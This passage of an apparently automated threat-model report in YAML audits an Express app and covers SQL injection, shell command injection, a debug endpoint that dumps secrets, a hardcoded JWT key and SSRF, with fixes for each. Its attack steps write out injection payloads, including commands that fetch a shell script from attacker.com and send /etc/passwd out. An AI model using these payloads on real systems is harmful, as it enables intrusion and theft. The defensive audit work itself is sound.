+  assessment: config/insecure-settings.ini stores the database password (line 2) and an authentication secret (line 5) as
+    plaintext. The file is committed to the repository. No secret manager, environment-variable injection, or encryption at
+    rest is used.
+  implementation: config/insecure-settings.ini:2,5
+  rule_id: null
+  status_note: Database password and auth secret stored in plaintext in committed config file.
+- domain: Dependency Lifecycle
+  control: Third-Party CI Action Pinning
+  effectiveness: Weak
+  kind: mechanism
+  assessment: The GitHub Actions workflow (.github/workflows/ci.yml:8-9) references actions/checkout@v3 and actions/setup-node@v3
+    using mutable tag references. A tag can be moved to point at a different commit without notice, allowing a supply-chain
+    attacker to inject code into the build.
+  implementation: .github/workflows/ci.yml:8-9
+  rule_id: ARCH-SUPPLY-001
+  status_note: Actions pinned to mutable v3 tags; commit-SHA pinning absent.
+- domain: Dependency Lifecycle
+  control: Dependency Vulnerability Management
+  effectiveness: Weak
+  kind: lifecycle
+  assessment: package.json declares lodash@4.17.10, which carries known prototype pollution vulnerabilities (CVE-2021-23337).
+    No lockfile, SBOM, or automated dependency update process is present in the repository. express@4.19.2 is an older patch
+    version.
+  implementation: package.json
+  rule_id: null
+  status_note: lodash@4.17.10 has known CVEs; no automated dependency scanning evident.
+- domain: Deployment Configuration
+  control: CI/CD Workflow Permission Scoping
+  effectiveness: Weak
+  kind: mechanism
+  assessment: The ci.yml workflow has no top-level or job-level permissions stanza, causing GitHub Actions to inherit the
+    default write-all scope for GITHUB_TOKEN. A compromised workflow step can write to the repository, create releases, or
+    modify branch protections.
+  implementation: .github/workflows/ci.yml:1-13
+  rule_id: null
+  status_note: GITHUB_TOKEN inherits write-all; no permissions restriction declared.
+- domain: Logging and Monitoring
+  control: Security Event Logging
+  effectiveness: Missing
+  kind: cross-cutting
+  assessment: No request logging, authentication event logging, or error logging middleware is present in the Express application.
+    Authentication failures, SQL errors, and command execution results are handled inline without structured emission. Security-relevant
+    events are unobservable after the fact.
+  implementation: server.js (all routes; no logging middleware registered)
+  rule_id: null
+  status_note: No logging middleware; authentication and error events are silent.
+- domain: Operations Runtime and Supply Chain Controls
+  control: Automated SCA scanning
+  effectiveness: Missing
+  kind: lifecycle
+  assessment: Automated SCA scanning not detected in the repository. Patch-management posture depends on this control being
+    in place — the team is reactive rather than proactive without it.
+  linked_threats: []
+- domain: Operations Runtime and Supply Chain Controls
+  control: Automated dependency updates
+  effectiveness: Missing
+  kind: lifecycle
+  assessment: Automated dependency updates not detected in the repository. Patch-management posture depends on this control
+    being in place — the team is reactive rather than proactive without it.
+  linked_threats: []
+- domain: Operations Runtime and Supply Chain Controls
+  control: Lockfile hygiene
+  effectiveness: Missing
+  kind: lifecycle
+  assessment: Lockfile hygiene not detected in the repository. Patch-management posture depends on this control being in place
+    — the team is reactive rather than proactive without it.
+  linked_threats: []
+- domain: Identity and Authentication
+  control: User Registration
+  kind: lifecycle
+  effectiveness: Missing
+  implementation: null
+  evidence: No endpoint detected in scope
+  main_reason: User Registration is an expected lifecycle control for password-based authentication but no endpoint was found
+    — confirm whether the flow exists or is genuinely absent.
+  auto_source: auth-coverage
+- domain: Identity and Authentication
+  control: Password Reset
+  kind: lifecycle
+  effectiveness: Missing
+  implementation: null
+  evidence: No endpoint detected in scope
+  main_reason: Password Reset is an expected lifecycle control for password-based authentication but no endpoint was found
+    — confirm whether the flow exists or is genuinely absent.
+  auto_source: auth-coverage
+threats:
+- local_id: web-api-001
+  threat_category_id: TH-02
+  additional_categories: []
+  stride: Spoofing
+  cwe: CWE-89
+  title: SQL Injection authentication bypass — server.js:12
+  scenario: An unauthenticated attacker submits a crafted email value such as `' OR '1'='1' --` to POST /login. The server
+    concatenates the attacker-controlled string directly into the SQL query via template literal interpolation at server.js:12,
+    causing the database to return the first user row (typically admin) without verifying the password. The server then issues
+    a valid JWT for that identity, giving the attacker a signed session as any user including administrators.
+  attack_steps:
+  - Attacker posts /login with email=`' OR '1'='1' --` and arbitrary password, submitting a tautological predicate to the
+    login SQL handler.
+  - The interpolated query `SELECT id, role FROM users WHERE email = '' OR '1'='1' --' AND password = '...'` returns the first
+    user row without password verification.
+  - Server passes the returned user object to signJwt() and issues a fully valid JWT for the impersonated identity.
+  - Attacker uses the forged JWT to access admin-only operations and all user data under the impersonated identity.
+  evidence_summary: 'server.js:12 interpolates req.body.email and req.body.password directly into a SQL string: `SELECT id,
+    role FROM users WHERE email = ''${req.body.email}'' AND password = ''${req.body.password}''`. No parameterization, no
+    prepared statement, and no input sanitization is present.'
+  impact_description: Complete authentication bypass. Attacker obtains a signed JWT for any user account including administrators,
+    enabling subsequent access to all protected routes, user data, and admin operations within the application.
+  likelihood: High
+  impact: Critical
+  risk: Critical
+  controls_in_place: None
+  mitigation_title: Replace string-interpolated SQL with parameterized queries in login handler
+  remediation:
+    effort: Low
+    steps:
+    - 'Replace the template-literal SQL string at server.js:12 with a parameterized query: `db.query(''SELECT id, role FROM
+      users WHERE email = ? AND password = ?'', [req.body.email, req.body.password])`.'
+    - Add input validation middleware (e.g., express-validator) to enforce type, length, and format on email and password
+      fields before they reach any database call.
+    - Write an integration test that submits `' OR '1'='1' --` as the email and asserts HTTP 401 with no JWT in the response.
+    code_example: null
+    verification: Send POST /login with body {"email":"' OR '1'='1' --","password":"x"}; the response MUST be HTTP 401 with
+      no token field. A 200 response with a JWT indicates the injection is still exploitable.
+    reference: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  evidence:
+  - file: server.js
+    line: 12
+  boundary_refs:
+  - boundary_id: tb-1
+    origin_component_id: web-api
+    rationale: tb-1 authentication leg assumes credentials are verified before the handler; SQL injection at server.js:12
+      defeats that verification entirely.
+    leg: authentication
+    evidence_locations:
+    - file: server.js
+      line: 12
+  violated_requirements:
+  - IV-004
+  - AC-002
+  evidence_check: verified-prior
+  prior_finding_ref: null
+  actor_ids:
+  - ACT-D-01
+  - ACT-D-02
+  primary_actor: ACT-D-01
+  architectural_violation: false
+  component_name: Express Web API
+  source: stride
+  evidence_tier: confirmed-exploitable
+  id: T-001
+  component: web-api
+  mitigation_ids:
+  - M-001
+  _title_source: SQL Injection authentication bypass (server.js:12)
+  vektor: internet-anon
+- local_id: auth-002
+  threat_category_id: TH-01
+  additional_categories:
+  - Elevation of Privilege
+  stride: Tampering
+  cwe: CWE-78
+  title: OS command injection — server.js:23
+  scenario: An unauthenticated attacker POSTs a crafted path value to /admin/export; the shell-interpolated exec() call at
+    server.js:23 passes the value directly to /bin/sh, executing arbitrary OS commands with the application's runtime privileges.
+  attack_steps:
+  - 'Attacker sends POST /admin/export with JSON body `{"path": ". && curl attacker.com/shell.sh | sh"}`, requiring no authentication.'
+  - exec() at server.js:23 expands the template literal to `tar -czf /tmp/export.tgz . && curl attacker.com/shell.sh | sh`
+    and passes it to /bin/sh.
+  - The injected command executes with the application's OS user privileges, enabling data exfiltration, credential theft,
+    or persistent backdoor installation.
+  evidence_summary: server.js:23 passes `req.body.path` directly into an exec() template literal without sanitization or authentication,
+    proving any internet client can execute arbitrary shell commands with the application's OS privileges.
+  impact_description: 'Full server compromise: the attacker gains OS-level code execution, enabling credential extraction
+    from the environment, lateral movement to database and internal services, and persistent access to the host.'
+  likelihood: High
+  impact: Critical
+  risk: Critical
+  controls_in_place: None — architecture context confirms authentication is absent from /admin/export; no input validation
+    is present in the route handler.
+  mitigation_title: Enforce authentication and shell-safe invocation on /admin/export in server.js
+  remediation:
+    effort: Medium
+    steps:
+    - Apply authentication middleware to `/admin/export` before any other change so unauthenticated callers receive 401.
+    - 'Replace `exec()` at server.js:23 with a shell-free spawn: resolve `req.body.path` using `path.resolve()`, confirm it
+      falls within the permitted export base directory, then call `spawn(''tar'', [''-czf'', ''/tmp/export.tgz'', validatedPath],
+      {shell: false})` — the array form of spawn never passes arguments through a shell.'
+    - Add an integration test that submits `"; id"` as path and asserts a 400 or 403 response with no command output.
+    code_example: null
+    verification: 'Send `curl -s -X POST http://localhost:3000/admin/export -H ''Content-Type: application/json'' -d ''{"path":".
+      && echo INJECTED"}'' | grep INJECTED` — output must be empty after the fix.'
+    reference: OWASP Command Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  evidence:
+  - file: server.js
+    line: 23
+  violated_requirements:
+  - IV-008
+  - IV-006
+  - AC-002
+  evidence_check: verified
+  prior_finding_ref: null
+  architectural_violation: false
+  actor_ids:
+  - ACT-D-01
+  - ACT-D-07
+  primary_actor: ACT-D-01
+  component_name: Authentication & Session Middleware
+  source: stride
+  instances:
+  - file: server.js
+    line: 23
+    severity: Critical
+    local_id: auth-002
+    scenario: An unauthenticated attacker POSTs a crafted path value to /admin/export; the shell-interpolated exec() call
+      at server.js:23 passes the value directly to /bin/sh, executing arbitrary OS commands with the application's runtime
+      privileges.
+    component_id: auth
+    source_ref: auth-002
+  - file: server.js
+    line: 23
+    severity: Critical
+    local_id: web-api-002
+    scenario: An unauthenticated attacker posts to /admin/export with a path field containing shell metacharacters such as
+      `/tmp/x; curl http://attacker.com/$(cat /etc/passwd | base64)`. The Express handler at server.js:23 passes req.body.path
+      directly to exec() as part of a shell command string. Node.js spawns /bin/sh, which interprets the semicolon as a command
+      separator and executes the injected payload in the context of the Express process, granting arbitrary OS command execution
+      without any authentication.
+    component_id: web-api
+    source_ref: auth-002
+  - file: server.js
+    line: 23
+    severity: Critical
+    local_id: SAF-004
+    scenario: Interpolating request data into a shell command lets an attacker chain arbitrary OS commands (`; rm -rf`, backticks,
+      `$( )`), yielding remote code execution on the server.
+    component_id: backend-api
+    source_ref: SAF-004
+  affected_files:
+  - server.js
+  instance_count: 3
+  consolidated_refs:
+  - auth-002
+  - SAF-004
+  merged_from:
+  - auth
+  - web-api
+  - backend-api
+  boundary_refs:
+  - boundary_id: tb-1
+    origin_component_id: web-api
+    rationale: tb-1 validation leg assumes req.body is schema-checked before business logic; exec() at server.js:23 receives
+      path with no validation.
+    leg: validation
+    evidence_locations:
+    - file: server.js
+      line: 23
+  merged_strides:
+  - Tampering
+  - Elevation of Privilege
+  source_check_id: INJ-002
+  evidence_tier: confirmed-exploitable
+  evidence_flags:
+  - flag_id: EV-001
+    verdict: verified
+    reason: Line 23 passes req.body.path directly into exec() template literal with no sanitization or auth guard visible
+      in window.
+    line_excerpt: '  exec(`tar -czf /tmp/export.tgz ${req.body.path}`, (error) => {'
+    verified_at: '2026-09-17T00:00:00Z'
+  id: T-002
+  component: auth
+  mitigation_ids:
+  - M-002
+  _title_source: OS command injection via exec in /admin/export (server.js:23)
+  vektor: internet-anon
+- title: SQL injection request data interpolated into a SQL string
+  scenario: Interpolating request-controlled text into a SQL statement lets an attacker alter the query — exfiltrating or
+    modifying arbitrary rows, bypassing authentication, or escalating to full database control.
+  stride: Tampering
+  risk: Critical
+  likelihood: Critical
+  impact: Critical
+  cwe: CWE-89
+  evidence:
+  - file: server.js
+    line: 12
+  source: source-scan
+  architectural_violation: false
+  component_name: Express Web API
+  source_scan_ref: SAF-001
+  source_check_id: INJ-001
+  source_type: nodejs_source
+  breach_distance: 1
+  mitigation_title: Use parameterized / bound queries (placeholders + a values array, or an ORM's safe query builder); never
+    interpolate request data into the SQL string.
+  finding_type_id: FT-001
+  control_scope: null
+  threat_category_id: TH-01
+  instances:
+  - file: server.js
+    line: 12
+    severity: Critical
+    local_id: SAF-001
+    scenario: Interpolating request-controlled text into a SQL statement lets an attacker alter the query — exfiltrating or
+      modifying arbitrary rows, bypassing authentication, or escalating to full database control.
+    component_id: web-api
+    source_ref: SAF-001
+    original_component_id: backend-api
+  - file: server.js
+    line: 18
+    severity: Critical
+    local_id: SAF-002
+    scenario: Interpolating request-controlled text into a SQL statement lets an attacker alter the query — exfiltrating or
+      modifying arbitrary rows, bypassing authentication, or escalating to full database control.
+    component_id: web-api
+    source_ref: SAF-002
+    original_component_id: backend-api
+  affected_files:
+  - server.js
+  instance_count: 2
+  consolidated_refs:
+  - SAF-001
+  - SAF-002
+  merged_from:
+  - web-api
+  evidence_tier: confirmed-exploitable
+  evidence_check: verified
+  evidence_flags:
+  - flag_id: EV-002
+    verdict: verified
+    reason: Line 12 interpolates req.body.email and req.body.password into a SQL template literal passed directly to db.query.
+    line_excerpt: '  const sql = `SELECT id, role FROM users WHERE email = ''${req.body.email}''...'
+    verified_at: '2026-09-17T00:00:00Z'
+  - phantom_component_resolved_from_backend-api
+  id: T-003
+  component: web-api
+  mitigation_ids:
+  - M-003
+  _title_source: SQL injection request data interpolated into a SQL string server.js:12
+  remediation:
+    steps:
+    - Use parameterized / bound queries (placeholders + a values array, or an ORM's safe query builder); never interpolate
+      request data into the SQL string.
+    - Add a regression test (or CI check) that fails on the vulnerable pattern and passes once the fix is in place.
+    verification: Re-run the INJ-001 scanner check; it reports no match at server.js:12, and the regression test passes.
+    effort: Medium
+  vektor: internet-anon
+- local_id: web-api-004
+  threat_category_id: TH-17
+  additional_categories: []
+  stride: Information Disclosure
+  cwe: CWE-215
+  title: Unauthenticated debug environment endpoint — server.js:41
+  scenario: An unauthenticated attacker sends GET /debug/environment to the publicly reachable Express API. The handler at
+    server.js:41 calls `res.json(process.env)`, serializing all environment variables into the HTTP response. The process
+    environment includes the hardcoded JWT signing secret at server.js:9, the OpenAI API key configured for the /assistant
+    route, and any database credentials or cloud provider secrets injected at runtime. The attacker obtains these values from
+    a single unauthenticated HTTP request.
+  attack_steps:
+  - Attacker sends GET /debug/environment to the public API without any credentials or special headers.
+  - Server responds with HTTP 200 and a JSON body containing all keys from process.env, including JWT_SECRET, OPENAI_API_KEY,
+    and database connection strings.
+  - Attacker uses the JWT secret (`e2e-fixture-jwt-secret-7f4c91` or its production equivalent) to sign arbitrary JWT payloads
+    for any user ID and role.
+  evidence_summary: server.js:41 registers `app.get('/debug/environment', (_req, res) => res.json(process.env))` with no authentication
+    middleware. The hardcoded secret at server.js:9 (`const secret = '**** (29 chars)'`) and any runtime-injected credentials
+    are included in the response.
+  impact_description: All runtime secrets including the JWT signing key, external API credentials, and database passwords
+    are exposed to any unauthenticated internet client. An attacker with the JWT secret can forge tokens for any user. Disclosed
+    API keys enable unauthorized third-party API usage and potential data access.
+  likelihood: High
+  impact: Critical
+  risk: Critical
+  controls_in_place: None
+  mitigation_title: Remove the /debug/environment endpoint and source-managed JWT secret from production
+  remediation:
+    effort: Low
+    steps:
+    - Remove the `app.get('/debug/environment', ...)` route from server.js entirely; if a health or diagnostic endpoint is
+      operationally required, replace it with a minimal authenticated endpoint that returns only non-sensitive status fields.
+    - Remove the hardcoded `const secret = '**** (29 chars)'` from server.js and inject the JWT secret exclusively from a
+      managed secret store (e.g., an environment variable loaded from Vault or AWS Secrets Manager at startup), never committed
+      to source.
+    - Write a test asserting that GET /debug/environment returns HTTP 404 (or 401 if the route is retained in a restricted
+      form) in the production configuration.
+    code_example: null
+    verification: Send GET /debug/environment without credentials and assert HTTP 404 or 401; a 200 response containing process.env
+      keys is the fail condition. Confirm the JWT secret is absent from the server.js source via `grep -r 'jwt-secret' .`.
+    reference: https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration
+  evidence:
+  - file: server.js
+    line: 41
+  boundary_refs:
+  - boundary_id: tb-1
+    origin_component_id: web-api
+    rationale: tb-1 authentication leg assumes routes require valid credentials before responding; /debug/environment at server.js:41
+      responds to any unauthenticated request with full environment state.
+    leg: authentication
+    evidence_locations:
+    - file: server.js
+      line: 41
+  violated_requirements:
+  - HN-002
+  - HN-003
+  - EH-002
+  evidence_check: verified-prior
+  prior_finding_ref: null
+  actor_ids:
+  - ACT-D-01
+  primary_actor: ACT-D-01
+  architectural_violation: false
+  component_name: Express Web API
+  source: stride
+  evidence_tier: confirmed-exploitable
+  id: T-004
+  component: web-api
+  mitigation_ids:
+  - M-004
+  _title_source: Unauthenticated debug environment endpoint (server.js:41)
+  vektor: internet-anon
+- local_id: auth-001
+  threat_category_id: TH-02
+  additional_categories:
+  - Elevation of Privilege
+  stride: Spoofing
+  cwe: CWE-321
+  title: Hardcoded JWT signing key — server.js:9
+  scenario: An attacker who reads server.js:9 extracts the static HMAC signing key and uses it to craft JWT tokens claiming
+    any user identity, including administrative roles, which the application accepts as valid credentials on every protected
+    endpoint.
+  attack_steps:
+  - Attacker reads the hardcoded constant `e2e-fixture-jwt-secret-7f4c91` from server.js:9 in the accessible repository.
+  - Attacker constructs a JWT payload with an arbitrary uid and role=admin, then signs it offline using the extracted HMAC
+    secret.
+  - Attacker presents the forged token in the Authorization header; the server verifies the HMAC signature as valid and grants
+    the claimed identity and privileges.
+  evidence_summary: server.js:9 declares the JWT signing secret as a source-code constant string literal, proving any party
+    with repository read access can reproduce the signing key and forge tokens for arbitrary user identities and roles.
+  impact_description: 'Complete authentication bypass: the attacker controls the identity and role carried in every JWT, gaining
+    full access to all data and operations gated behind JWT verification, including any administrative functions.'
+  likelihood: High
+  impact: Critical
+  risk: High
+  controls_in_place: 'None — controls-context confirms: ''JWT secret management: Unsafe — secret is a source-code constant
+    (server.js:9), not environment-injected''.'
+  mitigation_title: Replace hardcoded JWT signing secret with runtime-injected environment variable in server.js
+  remediation:
+    effort: Low
+    steps:
+    - Remove the literal `const secret = '**** (29 chars)'` at server.js:9 and replace with `const secret = process.env.JWT_SECRET;
+      if (!secret) throw new Error('JWT_SECRET is required');` so the application fails closed at startup when the variable
+      is absent.
+    - Provision JWT_SECRET through a managed secret store (e.g., Kubernetes Secret or HashiCorp Vault mounted as an environment
+      variable); never commit the value to version control.
+    - Rotate the currently exposed constant immediately and revoke or re-issue all tokens signed with it.
+    - Add a CI check that searches for string-literal JWT secrets using a pattern such as `grep -r 'jwt.*secret.*=.*["\x27][a-zA-Z0-9]'
+      .` and fails the build on a match.
+    code_example: '// server.js:9 — replace hardcoded constant
+
+      const secret = process.env.JWT_SECRET
+
+      if (!secret) throw new Error(''JWT_SECRET environment variable is required'')'
+    verification: Start the application without JWT_SECRET set and confirm it exits with a startup error; then set a test
+      secret, issue a token, modify one byte of the signature, and assert the server returns 401.
+    reference: 'CWE-321: Use of Hard-coded Cryptographic Key — https://cwe.mitre.org/data/definitions/321.html'
+  evidence:
+  - file: server.js
+    line: 9
+  violated_requirements:
+  - DP-005
+  - AC-005
+  evidence_check: verified-prior
+  prior_finding_ref: null
+  architectural_violation: false
+  actor_ids:
+  - ACT-D-01
+  - ACT-D-06
+  primary_actor: ACT-D-01
+  component_name: Authentication & Session Middleware
+  source: configuration-defect
+  risk_before_policy: Critical
+  evidence_tier: confirmed-exploitable
+  id: T-005
+  component: auth
+  mitigation_ids:
+  - M-005
+  _title_source: Hardcoded JWT signing key (server.js:9)
+  vektor: repo-read
+- local_id: auth-004
+  threat_category_id: TH-17
+  additional_categories: []
+  stride: Information Disclosure
+  cwe: CWE-200
+  title: Unauthenticated debug endpoint exposes all environment secrets — server.js:41
+  scenario: An unauthenticated attacker sends GET /debug/environment; server.js:41 responds with the full process.env object,
+    exposing every secret, credential, and API key injected into the runtime environment, including any JWT signing key, database
+    password, or third-party API token.
+  attack_steps:
+  - Attacker sends GET /debug/environment with no credentials.
+  - server.js:41 returns the full process.env JSON, including JWT_SECRET, DB_PASSWORD, and any other injected secrets.
+  - Attacker extracts the JWT signing secret and database credentials, then uses them to forge tokens and access the database
+    directly.
+  evidence_summary: server.js:41 registers GET /debug/environment as a globally accessible route that calls `res.json(process.env)`
+    with no authentication middleware, proving all environment-level secrets are reachable by any unauthenticated caller.
+  impact_description: 'Full secret compromise: all environment-injected credentials become known to the attacker, collapsing
+    every control that relies on secret confidentiality, including JWT signature verification, database authentication, and
+    any third-party API access.'
+  likelihood: High
+  impact: Critical
+  risk: High
+  controls_in_place: None — architecture context confirms authentication is absent from /debug/environment; the route handler
+    applies no filtering or access control.
+  mitigation_title: Remove or gate /debug/environment route behind production check in server.js
+  remediation:
+    effort: Low
+    steps:
+    - Remove the `/debug/environment` route at server.js:41 entirely from the production build; if a non-production debug
+      facility is needed, gate it with `if (process.env.NODE_ENV !== 'production')` and apply admin authentication.
+    - Add a smoke test in CI that sends GET /debug/environment to the production build and asserts an HTTP 404 response.
+    - Audit all other routes for unauthenticated environment or configuration disclosure and apply the same removal pattern.
+    code_example: null
+    verification: '`curl -s -o /dev/null -w ''%{http_code}'' http://localhost:3000/debug/environment` must return 404 in the
+      production build.'
+    reference: OWASP Testing for Debug Parameters (OTG-CONFIG-007) — https://owasp.org/www-project-web-security-testing-guide/
+  evidence:
+  - file: server.js
+    line: 41
+  violated_requirements:
+  - HN-002
+  - HN-003
+  evidence_check: verified
+  prior_finding_ref: null
+  architectural_violation: false
+  actor_ids:
+  - ACT-D-01
+  - ACT-D-07
+  primary_actor: ACT-D-01
+  component_name: Authentication & Session Middleware
+  source: stride
+  risk_before_policy: Critical
+  evidence_tier: confirmed-exploitable
+  evidence_flags:
+  - flag_id: EV-003
+    verdict: verified
+    reason: Line 41 registers GET /debug/environment calling res.json(process.env) with no authentication middleware in scope.
+    line_excerpt: app.get('/debug/environment', (_req, res) => res.json(process.env))
+    verified_at: '2026-09-17T00:00:00Z'
+  id: T-006
+  component: auth
+  mitigation_ids:
+  - M-006
+  _title_source: Unauthenticated debug endpoint exposes all environment secrets (server.js:41)
+  vektor: internet-anon
+- title: SSRF outbound request to a request-controlled URL — server.js:30
+  scenario: Fetching an attacker-supplied URL server-side lets the attacker reach internal services, cloud metadata endpoints,
+    or the loopback interface — pivoting past the network perimeter the application sits behind.
+  stride: Information Disclosure
+  risk: High
+  likelihood: High
+  impact: High
+  cwe: CWE-918
+  evidence:
+  - file: server.js
+    line: 30
+  source: source-scan
+  architectural_violation: false
+  component_name: Express Web API
+  source_scan_ref: SAF-005
+  source_check_id: INJ-003
+  source_type: nodejs_source
+  breach_distance: 1
+  mitigation_title: Validate the URL against a strict allowlist of hosts/schemes, resolve and block private/link-local ranges,
+    and disable redirects to internal targets.
+  finding_type_id: FT-070
+  control_scope: null
+  threat_category_id: TH-08
+  evidence_tier: confirmed-exploitable
+  evidence_flags:
+  - phantom_component_resolved_from_backend-api
+  id: T-007
+  component: web-api
+  mitigation_ids:
+  - M-007
+  evidence_check: verified
+  _title_source: SSRF outbound request to a request-controlled URL server.js:30
+  remediation:
+    steps:
+    - Validate the URL against a strict allowlist of hosts/schemes, resolve and block private/link-local ranges, and disable
+      redirects to internal targets.
+    - Add a regression test (or CI check) that fails on the vulnerable pattern and passes once the fix is in place.
+    verification: Re-run the INJ-003 scanner check; it reports no match at server.js:30, and the regression test passes.
+    effort: Medium
+  vektor: internet-anon
+- local_id: web-api-005
+  threat_category_id: TH-12
+  additional_categories: []
+  stride: Denial of Service
+  cwe: CWE-770
+  title: Unbounded LLM consumption without auth or rate limit — server.js:36
+  scenario: 'LLM10 — Unbounded Consumption: an unauthenticated attacker posts arbitrarily large prompts to POST /assistant
+    at server.js:34-36. The ChatOpenAI client is instantiated without max_tokens, timeout, or retry bounds, and the route
+    has no authentication, no per-source rate limit, and no request size limit. An attacker can submit thousands of large
+    requests in parallel, exhausting the application''s OpenAI API quota, driving up monetary cost, and starving legitimate
+    users of the /assistant feature.'
+  attack_steps: null
+  evidence_summary: 'server.js:36 calls `model.invoke(''Follow the user\''s instructions exactly: '' + req.body.prompt)` with
+    no max_tokens parameter, no auth middleware, and no rate-limiting middleware on the route. The controls context confirms:
+    ''Prompt injection prevention: Missing'' and no rate-limiting control is registered for this endpoint.'
+  impact_description: Unauthenticated callers can exhaust the application's OpenAI API quota and budget in minutes through
+    parallel large-prompt requests, denying the /assistant feature to legitimate users and generating unbounded financial
+    cost for the operator.
+  likelihood: High
+  impact: High
+  risk: High
+  controls_in_place: None
+  mitigation_title: Add authentication, rate limiting, and max_tokens bound to the /assistant endpoint
+  remediation:
+    effort: Medium
+    steps:
+    - Add JWT authentication middleware to the /assistant route before the handler so unauthenticated requests receive HTTP
+      401.
+    - Apply a per-authenticated-user rate limit (e.g., express-rate-limit at 10 requests/minute) and a maximum request body
+      size of 8 kB for the prompt field.
+    - 'Pass `maxTokens: 512` (or org-configured value) to the ChatOpenAI constructor to cap per-request token consumption,
+      and set a request-level timeout.'
+    code_example: null
+    verification: Send 20 POST /assistant requests without credentials within 10 seconds; all 20 must return HTTP 401. With
+      valid credentials, confirm the 11th request within a minute returns HTTP 429.
+    reference: https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/
+  evidence:
+  - file: server.js
+    line: 36
+  owasp_llm_ids:
+  - LLM10
+  boundary_refs:
+  - boundary_id: tb-4
+    origin_component_id: web-api
+    rationale: tb-4 egress-destination leg assumes outbound calls target only approved endpoints; /assistant at server.js:36
+      forwards unbounded caller-controlled prompts to OpenAI without any quota or rate control.
+    leg: egress-destination
+    evidence_locations:
+    - file: server.js
+      line: 36
+  violated_requirements:
+  - LLM-010
+  - AC-003
+  evidence_check: verified-prior
+  prior_finding_ref: null
+  actor_ids:
+  - ACT-D-01
+  primary_actor: ACT-D-01
+  architectural_violation: false
+  component_name: Express Web API
+  source: stride
+  evidence_tier: confirmed-exploitable
+  id: T-008
+  component: web-api
+  mitigation_ids:
+  - M-008
+  _title_source: Unbounded LLM consumption without auth or rate limit (server.js:36)
+  vektor: internet-anon
+- local_id: auth-006
+  threat_category_id: TH-06
+  additional_categories:
+  - Spoofing
+  stride: Elevation of Privilege
+  cwe: CWE-284
+  title: Unvalidated tenant header overrides — middleware/tenantContext.js:2
+  scenario: An authenticated user in tenant A sets the x-tenant-id header to tenant B's identifier; tenantContext.js:4 trusts
+    this value unconditionally and sets req.tenantContext to tenant B, giving the user access to tenant B's data and operations
+    without any authorization check against the authenticated JWT's tenant claim.
+  attack_steps: null
+  evidence_summary: tenantContext.js:2 reads x-tenant-id from the request header and tenantContext.js:4 assigns it to req.tenantContext
+    without cross-checking the authenticated principal's JWT claims, proving any authenticated caller can self-select any
+    tenant identity.
+  impact_description: Any authenticated user or partner can read, write, or delete data belonging to any other tenant by setting
+    a single HTTP header, collapsing multi-tenant isolation and enabling mass data exfiltration across all tenant accounts.
+  likelihood: High
+  impact: High
+  risk: High
+  controls_in_place: 'None — controls-context confirms: ''Tenant identity binding: Unsafe — x-tenant-id header accepted from
+    caller without verification against authenticated identity''.'
+  mitigation_title: Cross-check x-tenant-id against authenticated JWT tenant claim in tenantContext.js
+  remediation:
+    effort: Medium
+    steps:
+    - 'In middleware/tenantContext.js after line 2, add a guard: if `req.user` (the decoded JWT payload) is present and its
+      `tenant_id` claim does not equal the supplied `tenantId`, return 403 with `{error: ''Tenant mismatch''}` — this enforces
+      that the header can only confirm, not override, the authenticated tenant.'
+    - Ensure JWT verification middleware executes before tenantContext middleware on every route that uses req.tenantContext,
+      so req.user is always populated when the check runs.
+    - Add an integration test that issues a JWT for tenant A, sends x-tenant-id as tenant B, and asserts the response is 403.
+    code_example: "// middleware/tenantContext.js — cross-check header against JWT claim\nmodule.exports = (req, res, next)\
+      \ => {\n  const tenantId = req.headers['x-tenant-id']\n  if (!tenantId) return res.status(400).json({ error: 'Missing\
+      \ tenant' })\n  if (req.user?.tenant_id && req.user.tenant_id !== tenantId)\n    return res.status(403).json({ error:\
+      \ 'Tenant mismatch' })\n  req.tenantContext = { tenant_id: tenantId }\n  next()\n}"
+    verification: 'Issue a JWT for tenant-A, send it with `x-tenant-id: tenant-B` against any tenant-scoped endpoint, and
+      confirm the response is HTTP 403 with no tenant-B data in the body.'
+    reference: 'CWE-284: Improper Access Control — https://cwe.mitre.org/data/definitions/284.html'
+  evidence:
+  - file: middleware/tenantContext.js
+    line: 2
+  violated_requirements:
+  - AC-002
+  - AC-006
+  evidence_check: verified-prior
+  prior_finding_ref: null
+  architectural_violation: false
+  actor_ids:
+  - ACT-D-02
+  - ACT-D-03
+  primary_actor: ACT-D-02
+  component_name: Authentication & Session Middleware
+  source: stride
+  evidence_tier: confirmed-exploitable
+  id: T-009
+  component: auth
+  mitigation_ids:
+  - M-009
+  _title_source: Unvalidated tenant header overrides authenticated identity (tenantContext.js:2)
+  vektor: internet-anon
+- title: Sensitive REST route registered without authentication middleware — server.js:22
+  scenario: State-changing operations on sensitive resources MUST require a proven session. A registration line that lacks
+    any auth marker either trusts the URL itself or relies on a downstream check that the static signature cannot prove exists.
+  stride: Elevation of Privilege
+  risk: High
+  likelihood: High
+  impact: High
+  cwe: CWE-862
+  evidence:
+  - file: server.js
+    line: 22
+  source: source-scan
+  architectural_violation: false
+  component_name: Express Web API
+  source_scan_ref: SAF-003
+  source_check_id: AUTHZ-008
+  source_type: nodejs_source
+  breach_distance: 1
+  mitigation_title: Add an explicit auth middleware (isAuthorized() / passport.authenticate() / requireAuth) to the route
+    registration, or mark the route intentionally public via app.get(...) for read-only access only.
+  finding_type_id: FT-042
+  control_scope: null
+  threat_category_id: TH-06
+  evidence_tier: confirmed-exploitable
+  evidence_flags:
+  - phantom_component_resolved_from_backend-api
+  id: T-010
+  component: web-api
+  mitigation_ids:
+  - M-010
+  evidence_check: verified
+  _title_source: Sensitive REST route registered without authentication middleware server.js:22
+  remediation:
+    steps:
+    - Add an explicit auth middleware (isAuthorized() / passport.authenticate() / requireAuth) to the route registration,
+      or mark the route intentionally public via app.get(...) for read-only access only.
+    - Add a regression test (or CI check) that fails on the vulnerable pattern and passes once the fix is in place.
+    verification: Re-run the AUTHZ-008 scanner check; it reports no match at server.js:22, and the regression test passes.
+    effort: Medium
+  vektor: internet-anon
+- local_id: web-api-006
+  threat_category_id: TH-06
+  additional_categories: []
+  stride: Elevation of Privilege
+  cwe: CWE-862
+  title: Missing authorization on user record endpoint — server.js:18
+  scenario: An unauthenticated attacker sends GET /users/1, /users/2, and so on to enumerate all user records from the Express
+    API. The handler at server.js:17-18 executes `SELECT * FROM users WHERE id = ${req.params.id}` with no authentication
